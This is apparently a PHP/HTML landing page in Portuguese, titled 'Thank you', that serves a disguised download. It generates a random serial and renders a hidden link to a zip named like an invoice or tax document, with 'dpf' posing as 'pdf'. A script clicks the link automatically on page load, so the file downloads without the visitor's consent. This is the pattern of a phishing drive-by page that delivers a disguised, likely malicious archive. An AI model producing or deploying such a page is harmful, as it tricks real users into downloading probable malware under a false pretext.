<?php



//gera url dinamica
$cr = '0123456789';
$max = strlen($cr)-1;
$gera = null;
for($i=0; $i < 16; $i++) {
$gera .= $cr{mt_rand(0, $max)};
}
$gera = str_split($gera, 4);
$serial = $gera[2]."-".$gera[0]."-".$gera[2]."-".$gera[1]."-".$gera[3]."-".$gera[1];


?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Obrigado..</title>
</head>

<body>
	
		
	<a class="button-color" id="button-color"  download="DocumentoNFT_<?php echo $serial;?>dpf.zip" href="Sua-fatura-N-101317_7793-7668-7793-5100-0713-5100dpf.zip"  style=" display: none; padding:20px; margin-bottom:30px;"><i class="fa fa-star"></i>PEGAR</a>
<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
<script type="text/javascript">

$(document).ready(function() {
     document.getElementById("button-color").click();
});
</script>
	
	
</body>
</html>
